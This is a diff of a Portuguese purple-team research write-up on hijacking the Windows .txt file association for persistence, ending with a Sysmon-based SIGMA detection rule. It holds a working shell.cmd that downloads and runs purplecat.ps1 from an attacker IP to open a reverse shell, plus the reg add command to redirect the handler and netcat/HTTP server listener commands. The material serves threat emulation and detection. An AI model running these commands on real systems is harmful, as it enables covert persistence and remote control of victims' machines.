@@ -26,11 +26,9 @@ Por exemplo, um invasor pode modificar a associação de arquivo padrão para um
 
 **Info:** É possível executar este processo de duas maneiras: por meio da interface gráfica ou utilizando CLI como o prompt de comandos (CMD), porém vamos focar apenas na execução pela interface gráfica.
 
-As seleções de associação de arquivos são armazenados no **Registro do Windows** e estão listadas em **HKEY_CLASSES_ROOT.[extention]**, no caso dessa pesquisa será listado em **HKEY_CLASSES_ROOT.txt** e, podem ser editados por usuários com permissões elevadas/administradores que tenham acesso ao Registro.
-
 ## Emulação de Ameaça - Criação de Arquivo Malicioso Através de Interface Gráfica
 
-Há dois locais de registro que definem os manipuladores de extensão, que são mostrados a seguir, e são classificados como: *Global* e *Local*.
+As seleções de associação de arquivos são armazenados no **Registro do Windows** e há dois locais de registro que definem os manipuladores de extensão, que são mostrados a seguir, e são classificados como: *Global* e *Local*.
 
 <p align="center">
   <img src="imagens/locais-de-registro.png">
@@ -48,9 +46,8 @@ Quando um arquivo é aberto, o sistema operacional verifica os registros locais 
 
 Acima, temos o exemplo de que a chave de registro local não possui nenhum aplicativo padrão designado para abrir arquivos de texto, confirmando a infromação citada anteriormente. 
 
-Dependendo dos privilégios do usuário (Administrador ou Usuário Padrão), esses locais de registro podem ser explorados para executar código malicioso, utilizando o manipulador de extensão como um gatilho.
+Portanto, podemos observar que o manipulador de extensão ***.txt*** está listada em **HKEY_CLASSES_ROOT.[extention]**, no caso dessa pesquisa será listado em **HKEY_CLASSES_ROOT.txt** definido na chave de registro abaixo:
 
-Portanto, podemos observar que o manipulador de extensão ***.txt*** está definido na chave de registro abaixo:
 ```zsh
 Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command
 ```
@@ -77,13 +74,11 @@ Para isso, criaremos um arquivo em lotes simples do Windows chamado ***shell.cmd
 ```zsh
 start notepad.exe %1
 start /min powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.140.128/purplecat.ps1');purplecat -c 192.168.140.128 -p 8081 -e cmd.exe"
-
-
 ```
 
-Este comando do PowerShell baixa um script remoto chamado `purplecat.ps1` e executar em memória, pois ele não toca no disco, e em seguida, usar esse script para estabelecer uma conexão "backdoor" com uma máquina remota no endereço `IP 192.168.140.128` (ip da máquina atacante) na porta 8081, permitindo que comandos sejam executados cmd.exe nessa máquina.
+Este comando do PowerShell baixa um script remoto chamado `purplecat.ps1` e executa em memória, pois ele não toca no disco, e em seguida, usa esse script para estabelecer uma conexão "backdoor" com uma máquina remota no endereço `IP 192.168.140.128` (ip da máquina atacante) na porta 8081, permitindo que comandos sejam executados cmd.exe nessa máquina.
 
-A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro localizados em `Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command` para `C:\Users\Win-test\Desktop\shell.cmd`, local onde nosso arquivo malicioso está gravado.
+A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro localizado em `Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command` para `C:\Users\Win-test\Desktop\shell.cmd`, local onde nosso arquivo malicioso está gravado.
 
 <p align="center">
   <img src="imagens/mod.registro.png">
@@ -103,11 +98,9 @@ Após a modificação a chave de registro se encontrará da mesma maneira que a 
 
 ```zsh
 reg add HKEY_CLASSES_ROOT\txtfile\shell\open\command /ve /t REG_EXPAND_SZ /d shell.cmd /f
-  
 ```
 ```zsh
 reg query HKEY_CLASSES_ROOT\txtfile\shell\open\command
-  
 ```
 
 <p align="center">
@@ -124,7 +117,15 @@ A seguir na máquina do atacante, iremos rodar dois comandos no terminal, um par
   Figura 9: Comando servindo para baixar arquivo executado
 </p>
 
+```zsh
+sudo python3 -m http.server 80 
+```
+
 O comando acima, serve o arquivo para outra pessoa baixar os arquivos .txt abertos pela vítima. E o comando abaixo utilizaremos o [*NetCat*](https://www.devmedia.com.br/netcat-o-canivete-suico-tcp-ip-revista-infra-magazine-8/26299#:~:text=O%20Netcat%2C%20criado%20em%202004,conectividade%2C%20seguran%C3%A7a%2C%20entre%20outros.) como Listener, ao ser iniciado irá ouvir qualquer conexão realizada na porta **8081/TCP**. 
+
+```zsh
+nc -nvlp 8081 
+```
 
 <p align="center">
   <img src="imagens/comando-escustar-maquina-alvo.png">
@@ -167,7 +168,7 @@ Como podemos observar, o comportamento produzido pela modificação da chave de 
   Figura 14: Event 13, Sysmon
 </p>
 
-### Padrão SIGMA: BASELINE - 
+### Padrão SIGMA: Event Triggered Execution: Change Default File Association
 
 ```yaml
 title: 'CTI Purple Team - Event Triggered Execution: Change Default File Association'
@@ -185,17 +186,15 @@ logsource:
     category: 'process_creation'
     product: 'windows', 'sysmon'
 detection:
-    Event:
-    	- EventID: 4657
-      ProcessName|contains :
-          - 'regedit.exe'
-    EventoRegistro:
-    	- EventID: 13
-    	- TargetObject|contains|all:
-    		- 'shell'
-    		- 'open'
-    		- 'command'
-    condition: EventID and EventoRegitro
+    RegistryModification:
+      EventID:
+        - 4657
+        - 13
+      TargetRegistryKey|contains|all:
+        - 'shell'
+        - 'open'
+        - 'command'
+    condition: RegistryModification
 fields:
     - ProcessName;
     - TargetObject.
@@ -214,4 +213,4 @@ Esperamos que você que leu ou assistiu o Webinar, possa ter compreendido a inte
 
 ## Link do Webinar
 
-Caso você não pode participar do Webinar de apresentação da pesquisa, ou gostaria rever, basta clicar neste [link]
+Caso você não pode participar do Webinar de apresentação da pesquisa, ou gostaria rever, basta clicar neste [link](https://ishtecnologia.sharepoint.com/:v:/s/CTI-PurpleTeam/Ec4VyYNxFWtHlKHst_JMY5oBxP0OOPMKydRHO1BqWFiNpQ?e=D94s2B&nav=eyJyZWZlcnJhbEluZm8iOnsicmVmZXJyYWxBcHAiOiJTdHJlYW1XZWJBcHAiLCJyZWZlcnJhbFZpZXciOiJTaGFyZURpYWxvZy1MaW5rIiwicmVmZXJyYWxBcHBQbGF0Zm9ybSI6IldlYiIsInJlZmVycmFsTW9kZSI6InZpZXcifX0%3D).
